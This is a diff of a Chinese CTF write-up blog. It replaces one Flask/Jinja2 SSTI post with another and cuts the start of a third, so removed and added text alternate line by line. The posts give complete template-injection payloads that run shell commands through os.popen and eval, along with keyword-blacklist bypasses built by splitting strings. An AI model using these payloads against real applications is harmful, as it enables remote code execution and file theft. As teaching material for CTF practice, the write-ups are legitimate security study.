-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
-</span></code></pre></div>
-<p><strong>也是先 <code>ls /</code> 再 <code>cat</code>，一样拿不到名字就没法读。</strong></p>
+<p><strong><code>config</code> 是 Flask 注入模板的全局变量。它出现就说明是 Flask，顺便还可能看到 SECRET_KEY。</strong></p>
+<p><strong>到这一步，两条路都可以走了。</strong></p>
 <hr />
-<h3 id="_3"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>加解密功能 → 解密的结果被当模板渲染
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → {{config}} 确认 Flask
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → url_for 能用 → 短路：url_for.__globals__
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → ls / 找到 this_is_the_flag.txt
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
+<h3 id="_3"><a class="toclink" href="bjdctf2-fake-google-ssti/#_3">路线一：从字面量往上爬（通用链）</a></h3>
+<p><strong>这条路不依赖任何框架给的名字，只靠 Python 的对象关系。</strong></p>
+<h4 id="_4"><a class="toclink" href="bjdctf2-fake-google-ssti/#_4">第一环：字符串的类</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{{''.__class__}}     →  &lt;class 'str'&gt;
 </span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_4">漏洞原理</a></h4>
-<p><strong>① 解密结果被当成模板源码</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<h4 id="_5"><a class="toclink" href="bjdctf2-fake-google-ssti/#_5">第二环：它的父类</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{''.__class__.__bases__[0]}}   →  &lt;class 'object'&gt;
 </span></code></pre></div>
-<p><strong>base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。</strong></p>
-<p><strong>② 黑名单是"词"，绕过靠"拼接"</strong></p>
-<p>过滤器查的是<strong>你原文里有没有那串字母</strong>；Jinja 求值时会把 <code>+</code> 算掉，得到完整字符串。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>原文：'o'+'s'      → 不含 os
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>求值：'os'          → 才是真正的属性名
+<p><strong>⚠️ 这里有个坑：<code>__base__</code>（单数）是</strong>一个类<strong>，不能下标；<code>__bases__</code>（复数）是</strong>元组<strong>，才能写 <code>[0]</code>。写成 <code>__base__[0]</code> 会返回空。</strong></p>
+<h4 id="_6"><a class="toclink" href="bjdctf2-fake-google-ssti/#_6">第三环：所有子类</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类
 </span></code></pre></div>
-<p><strong>过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。</strong></p>
-<p><strong>③ 长链和短链的区别只在入口</strong></p>
-<p>短链从<strong>框架注入的名字</strong>（<code>url_for</code>）出发，长链从<strong>字面量</strong>（<code>''</code>）出发。终点一样，都是拿到 <code>__builtins__</code>。</p>
-<h4 id="_5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_5">关键知识点</a></h4>
+<p><strong>这一步是分水岭：拿到的是内存里</strong>所有已加载的类<strong>。</strong></p>
+<h4 id="_7"><a class="toclink" href="bjdctf2-fake-google-ssti/#_7">第四环：找一个“身上带着模块全局空间”的类</a></h4>
+<p><strong>核心思路：找一个 <code>__init__.__globals__</code> 里带 <code>__builtins__</code> 或者直接带 <code>os</code> 的类。</strong></p>
+<p><strong>常见的几个候选：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>catch_warnings        → warnings 模块，globals 里有 __builtins__
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>_wrap_close           → os 模块，globals 里直接有 popen
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Popen                 → subprocess
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>FileLoader            → importlib
+</span></code></pre></div>
+<p><strong>怎么知道它们在列表第几个？我写了个本地脚本扫了一遍：</strong></p>
+<p><img alt="脚本找下标" src="../assets/images/bjdctf2-fake-google/02-script-indices.png" /></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">((</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">())):</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">'catch_warnings'</span><span class="p">,</span> <span class="s1">'_wrap_close'</span><span class="p">,</span> <span class="s1">'Popen'</span><span class="p">,</span> <span class="s1">'FileLoader'</span><span class="p">):</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">,</span> <span class="s1">'-&gt;'</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>⚠️ 下标是环境相关的。</strong>同样的脚本，在不同 Python 版本、不同 import 顺序下会给出不同的数字。我这边 <code>catch_warnings</code> 是 169、<code>_wrap_close</code> 是 117，靶机正好一致才打通的。<strong>换个环境就得重扫，或者用按名字筛的写法</strong>（见文末）。</p>
+<h4 id="_wrap_close-popen"><a class="toclink" href="bjdctf2-fake-google-ssti/#_wrap_close-popen">第五环：用 <code>_wrap_close</code> 直接拿 popen</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
+</span></code></pre></div>
+<p><strong><code>_wrap_close</code> 是 <code>os</code> 模块里的类，它的 <code>__init__.__globals__</code> 就是 <code>os</code> 模块的全局空间，里面直接有 <code>popen</code>，一步到位。</strong></p>
+<h4 id="catch_warnings-__builtins__"><a class="toclink" href="bjdctf2-fake-google-ssti/#catch_warnings-__builtins__">另一种：用 <code>catch_warnings</code> 走 <code>__builtins__</code></a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}
+</span></code></pre></div>
+<p><strong>为什么要绕 <code>eval</code> 和 <code>__import__</code>？因为 <code>catch_warnings</code> 的 globals 里没有 <code>os</code>，但有 <code>__builtins__</code>；<code>__builtins__</code> 里有 <code>__import__</code>，能 import 就能拿到任何模块。</strong></p>
+<p><strong>（<code>__builtins__</code> 在不同上下文里有时是 dict、有时是模块，所以有的写法用 <code>['__builtins__']</code>，有的用 <code>.builtins__</code>——注意前者是取键，后者是取属性。）</strong></p>
+<hr />
+<h3 id="_8"><a class="toclink" href="bjdctf2-fake-google-ssti/#_8">路线二：从框架给的钩子走（快）</a></h3>
+<p><strong>既然确认了是 Flask，就先看看模板里现成给了什么：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
+</span></code></pre></div>
+<p><img alt="url_for" src="../assets/images/bjdctf2-fake-google/03-url-for.png" /></p>
+<p><strong>它是函数——函数身上就有 <code>__globals__</code>。所以不需要爬几百个子类：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{url_for.__globals__}}                  →  一大坨 dict
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>{{(url_for.__globals__)['os']}}          →  &lt;module 'os' ...&gt;
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
+</span></code></pre></div>
+<p><strong>三行就出 flag。</strong></p>
+<p><strong>这就是两条路的区别：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>路线二（短）：url_for → __globals__ → os → 执行
+</span></code></pre></div>
+<p><strong>路线二快，但依赖 Flask 注入了 <code>url_for</code>；路线一慢，但只要是 Python 就通。实战里先试短的，不通再走长的。</strong></p>
+<hr />
+<h3 id="_9"><a class="toclink" href="bjdctf2-fake-google-ssti/#_9">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>一个输入框 → 试 SQL 注入，内容被原样打印
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 看源码，qaq 里有提示 sssssti
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → {{7*7}} = 49        确认模板被执行
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → {{7*'7'}} = 7777777  确认是 Jinja2
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → {{config}}        确认是 Flask
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>          │           → 挑 _wrap_close(117) / catch_warnings(169)
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>          │             → __init__.__globals__ → popen / __builtins__ → 执行
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行
+</span></code></pre></div>
+<h4 id="_10"><a class="toclink" href="bjdctf2-fake-google-ssti/#_10">漏洞原理</a></h4>
+<p><strong>① Jinja2 的 <code>{{ }}</code> 里是表达式，会被求值</strong></p>
+<p><strong>用户输入被拼进模板字符串后，<code>{{ }}</code> 里的内容不再当文字，而是交给 Python 求值。这是 SSTI 成立的第一步。</strong></p>
+<p><strong>② Python 的属性访问没有边界</strong></p>
+<p><strong>从任何一个对象出发，都能顺着 <code>__class__</code>（类）→ <code>__mro__</code> / <code>__bases__</code>（父类）→ <code>__subclasses__()</code>（所有子类）→ <code>__init__.__globals__</code>（定义时的模块空间）走到执行。这不是漏洞，是语言特性；漏洞在于</strong>模板允许你访问这些属性<strong>。</strong></p>
+<p><strong>③ 框架注入的全局变量是“现成的入口”</strong></p>
+<p><strong>Flask 会把 <code>config</code>、<code>request</code>、<code>session</code>、<code>url_for</code>、<code>lipsum</code>、<code>get_flashed_messages</code> 放进模板名字空间。它们本身是函数或对象，身上挂着 <code>__globals__</code>，等于给了一条捷径。</strong></p>
+<h4 id="_11"><a class="toclink" href="bjdctf2-fake-google-ssti/#_11">关键知识点</a></h4>
 <table>
 <thead>
 <tr>
@@ -4057,374 +4361,70 @@
 </thead>
 <tbody>
 <tr>
-<td>黑名单（本题）</td>
-<td><code>*</code> <code>eval</code> <code>os</code> <code>popen</code> <code>system</code> <code>import</code> <code>request</code> <code>subprocess</code> <code>flag</code>，子串匹配</td>
+<td><code>{{7*7}}</code> / <code>{{7*'7'}}</code></td>
+<td>引擎探测：回显 49 / 7777777 说明是 Jinja2</td>
 </tr>
 <tr>
-<td><code>+</code> 拼接</td>
-<td><code>'o'+'s'</code> 绕 <code>os</code>；<code>'this_is_the_fl'+'ag.txt'</code> 绕 <code>flag</code></td>
+<td><code>{{config}}</code></td>
+<td>Flask 的模板全局，能确认框架、有时能读到 SECRET_KEY</td>
 </tr>
 <tr>
-<td>子串陷阱</td>
-<td><code>host</code> 里含 <code>os</code> 也会被拦——拆词时每一段都要检查</td>
+<td><code>__class__</code></td>
+<td>任何对象都能拿到它的类</td>
 </tr>
 <tr>
-<td>POST-Redirect-GET</td>
-<td>结果存 session，302 的响应体里没有结果</td>
+<td><code>__base__</code> vs <code>__bases__</code></td>
+<td>前者是单个父类（不可下标），后者是元组（可 <code>[0]</code>）</td>
 </tr>
 <tr>
-<td>结果越长 cookie 越大</td>
-<td>因为结果被塞进了 session</td>
+<td><code>__subclasses__()</code></td>
+<td>内存里所有已加载的类，但<strong>下标因环境而异</strong></td>
 </tr>
 <tr>
-<td><code>\|selectattr</code></td>
-<td>按属性名筛，代替"数下标"跨环境稳定</td>
+<td><code>__globals__</code></td>
+<td>函数定义时所在的模块全局空间（只有 Python 层函数有，C 层 wrapper 没有）</td>
 </tr>
 <tr>
-<td><code>'__name__'</code> vs <code>'name'</code></td>
-<td>前者才有值，后者筛不出东西</td>
+<td><code>__builtins__</code></td>
+<td>里面有 <code>__import__</code>，能 import 就能拿任何模块</td>
 </tr>
 <tr>
-<td><code>'equalto'</code> 要加引号</td>
-<td>不加时报 <code>no test named Undefined</code></td>
+<td>点号 vs 方括号</td>
+<td><code>.</code> 取属性，<code>['x']</code> 取键，不能写成 <code>.['x']</code></td>
 </tr>
 <tr>
-<td>双层拆分</td>
-<td><code>eval</code> 那条：Jinja 层拆一次，Python 源码再拆一次</td>
+<td>生成器</td>
+<td><code>map</code> / <code>selectattr</code> 返回惰性生成器，要 <code>\|first</code> 或 <code>\|list</code> 才有值</td>
 </tr>
 <tr>
-<td><code>open</code> vs <code>eval</code></td>
-<td><code>open</code> 只读文件，不碰 shell，名单里也没它——比 <code>eval</code> 省事</td>
+<td>按名字筛代替下标</td>
+<td><code>\|selectattr('__name__','equalto','xxx')\|first</code>，跨环境稳定</td>
+</tr>
+<tr>
+<td>遇到过滤 <code>.__globals__</code></td>
+<td>用 <code>\|attr('__globals__')</code> 换形状（本题没有过滤，用不上）</td>
 </tr>
 </tbody>
 </table>
 <hr />
 <details class="note">
-<summary>两条链的完整 payload（实测）</summary>
-<p><strong>短路（<code>url_for</code>）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>长链（<code>subclasses</code> + <code>eval</code>，双层拆分）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>长链（<code>subclasses</code> + <code>open</code>，只有一层拆分，更省事）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>注意：<code>open</code> 版必须先知道文件名（靠 <code>ls /</code>），而且不能执行命令，只能读文件。</strong></p>
-</details>
-<hr />
-<details class="note">
-<summary>两道黑名单自查（我踩过的）</summary>
-<p><strong>① 以为 <code>url_for.__globals__</code> 被拦了</strong></p>
-<p>其实是 302 重定向，响应体里本来就没有结果。<strong>先分清"没执行"和"结果在下一页"。</strong></p>
-<p><strong>② <code>eval</code> 那条报 <code>nonono</code>，找不到是哪个词</strong></p>
-<p><strong>逐个测试是最快的办法</strong>：把可疑的词单独包成 <code>{{'xxx'}}</code> 发一遍，看哪个返回 <code>nonono</code>。</p>
-<p>我拆了 <code>import</code>、<code>popen</code>、<code>eval</code>，就是没拆 <code>"os"</code>。</p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/flask/" class="md-meta__link">Flask</a>, 
-              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 4 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="pasecactf_2019-flask_ssti"><a class="toclink" href="pasecactf2019-flask-ssti/">[pasecactf_2019] flask_ssti — 只有三个字符被拦</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — Flask SSTI（字符级过滤）+ 源码审计 + 异或解密</p>
-<p><strong>题目地址</strong>：NSSCTF / ctf2 复刻环境</p>
-<p><strong>Flag</strong>：<code>CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="pasecactf2019-flask-ssti/#_1">题目概述</a></h3>
-<p>页面叫 <strong>Skype ScreenName Generator</strong>：</p>
-<blockquote>
-<p>Just type your nickname. We will do some unicode magic.</p>
-</blockquote>
-<p>输入昵称，它给你套一层花里胡哨的装饰，比如：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>˜”*°★☆★_abc_★☆★°°*
-</span></code></pre></div>
-<p><strong>但这个页面一开始点不动——这是第一道坎。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="pasecactf2019-flask-ssti/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="pasecactf2019-flask-ssti/#step-1">Step 1：页面能开，但按钮点了没反应</a></h4>
-<p><strong>页面加载正常，输入框也输得进去，就是点 "Go" 什么都不发生。</strong></p>
-<p><strong>按 F12 看 Console，发现 <code>$ is not defined</code>。原因是页面引了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js
-</span></code></pre></div>
-<p><strong>Google 的 CDN，国内连不上。jQuery 没加载，<code>send()</code> 里的 <code>$.post</code> 自然跑不了。</strong></p>
-<p><strong>绕过办法：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>① 浏览器里按 ESC 停止加载（页面其实早就渲染完了）
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>② 让 Burp 把这条 CDN 请求 drop 掉
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>③ 直接看源码找接口，用 curl / python 发（最实用）
-</span></code></pre></div>
-<h4 id="step-2"><a class="toclink" href="pasecactf2019-flask-ssti/#step-2">Step 2：从源码里抠出接口</a></h4>
-<p><strong>页面里那段内联 JS 写得很清楚：</strong></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">send</span><span class="p">(){</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">nickname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">'#nickname'</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">nickname</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">){</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="s1">'nickname'</span><span class="o">:</span><span class="w"> </span><span class="nx">nickname</span><span class="p">},</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">      </span><span class="nx">$</span><span class="p">(</span><span class="s1">'#msg'</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;b&gt;'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&lt;/b&gt;'</span><span class="p">;</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="p">});</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">  </span><span class="p">}</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">}</span>
-</span></code></pre></div>
-<p><strong>接口：<code>POST /</code>，参数名 <code>nickname</code>。</strong></p>
-<h4 id="step-3"><a class="toclink" href="pasecactf2019-flask-ssti/#step-3">Step 3：先确认模板被执行</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST /            nickname={{7*7}}
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→ 49 ~♡ⓛⓞⓥⓔ♡~
-</span></code></pre></div>
-<p><strong>模板被执行了。</strong>（<code>{{7*'7'}}</code> 也试了，回 49 —— 等等，这里要说明：这道题是 Python 的 Jinja2，<code>{{7*'7'}}</code> 应该回 <code>7777777</code>。我一开始只测了 <code>{{7*7}}</code>，靠后面的报错才确认是 Jinja。）</p>
-<h4 id="step-4"><a class="toclink" href="pasecactf2019-flask-ssti/#step-4">Step 4：摸过滤 —— 只有三个字符</a></h4>
-<p><strong>先用 <code>{{config}}</code> 试，</strong>过了<strong>，返回一整个 Config 对象。说明不是关键词黑名单。</strong></p>
-<p><strong>但下面这些全报 <code>Your nickname contains restricted characters!</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for}}        ← 名字里有下划线
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>{{'__class__'}}    ← 有下划线 + 单引号
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>{{a.b}}            ← 有点
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>{{'a'}}            ← 有单引号
-</span></code></pre></div>
-<p><strong>能过的：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>{{"a"}}        双引号可以
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>{{[1,2]}}      方括号可以
